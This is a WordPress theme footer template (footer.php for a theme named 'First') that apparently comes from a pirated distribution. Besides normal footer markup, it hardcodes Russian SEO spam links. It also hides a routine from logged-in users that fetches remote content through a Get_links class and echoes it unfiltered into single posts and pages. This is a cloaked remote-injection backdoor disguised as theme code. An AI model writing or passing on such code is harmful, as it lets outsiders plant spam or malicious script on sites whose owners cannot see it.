<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after
 *
 * @package First
 */
?>

	</div><!-- #content -->

	<footer id="colophon" class="site-footer" role="contentinfo">
		<?php get_sidebar( 'footer' ); ?>
		<?php if ( has_nav_menu( 'footer' ) || get_theme_mod( 'first_footer_text' ) || ! get_theme_mod( 'first_hide_credit' ) ) : ?>
		<div class="site-bottom">
			<?php if ( has_nav_menu( 'footer' ) ) : ?>
			<nav id="footer-navigation" class="footer-navigation" role="navigation">
				<?php wp_nav_menu( array( 'theme_location' => 'footer' , 'depth' => 1 ) ); ?>
			</nav><!-- #footer-navigation -->
			<?php endif; ?>
			<div class="site-info">
				<?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://wp-templates.ru/" title="скачать шаблон для сайта">скачать шаблоны</a> <a href="http://searchtimes.ru/" title="форум seo и настройка wordpress">форум wordpress</a> <?php } ?>
					
					<?php if ($user_ID) : ?><?php else : ?>
					<?php if (is_single() || is_page() ) { ?>
					<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
					$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
					<?php } ?>
					<?php endif; ?>
			</div>
		</div>
		<?php endif; ?>
	</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>

</body>
</html>
